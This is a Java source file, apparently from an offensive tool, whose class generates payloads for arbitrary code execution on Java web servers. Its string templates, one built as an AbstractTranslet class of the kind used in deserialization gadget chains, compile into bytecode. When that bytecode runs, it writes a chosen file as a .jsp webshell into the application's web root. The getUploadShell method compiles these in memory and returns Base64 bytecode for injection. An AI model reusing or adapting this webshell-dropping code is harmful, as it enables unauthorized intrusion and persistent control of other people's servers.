package com.droplab.Utils.Factory;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.compile.JavaStringCompiler;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Base64;
import java.util.Map;

/**
 * 任意代码执行的代码生成工厂
 */
public class CodeFactory {
    private static CodeFactory codefactory = null;

    private final String uploadShell = "import java.io.PrintWriter;public class %s {public %s(){PrintWriter bsh = null;try {bsh = new PrintWriter(Thread.currentThread().getContextClassLoader().loadClass(\"%s\").getProtectionDomain().getCodeSource().getLocation().getPath().split(\"WEB-INF\")[0] + \"%s.jsp\");bsh.write(new String(java.util.Base64.getDecoder().decode(\"%s\")));bsh.close();} catch (Exception e) { }}}";
    private final String uploadShellTemplate = "import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.PrintWriter;import java.io.Serializable;public class %s extends AbstractTranslet implements Serializable {    public %s() {        PrintWriter bsh = null;        try {            bsh = new PrintWriter(Thread.currentThread().getContextClassLoader().loadClass(\"%s\").getProtectionDomain().getCodeSource().getLocation().getPath().split(\"WEB-INF\")[0] + \"%s.jsp\");            bsh.write(new String(java.util.Base64.getDecoder().decode(\"%s\")));            bsh.close();        } catch (Exception e) {        }    }    @Override    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {    }    @Override    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {            }}";

    public static CodeFactory instance() {
        if (codefactory != null) {

        } else {
            codefactory = new CodeFactory();
        }
        return codefactory;
    }

    public String getUploadShell(String type, String className, String filename, File file) { //获取类名
        try {
            String randomStr = CommonUtils.RandomStr(6);
            String content = "this is testing <||>";
            StringBuffer stringBuffer = new StringBuffer();
            String str = stringBuffer.append(content).append(new String(Files.readAllBytes(file.toPath()))).toString();
            String s = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8));
            String code = null;
            if (type.equals("template")) {
                code = String.format(uploadShellTemplate, randomStr, randomStr, className, filename, s);
            } else {
                code = String.format(uploadShell, randomStr, randomStr, className, filename, s);
            }
            JavaStringCompiler compiler = new JavaStringCompiler();
            Map<String, byte[]> compile = compiler.compile(randomStr + ".java", code);
            byte[] bytes = compile.get(randomStr);
            return Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
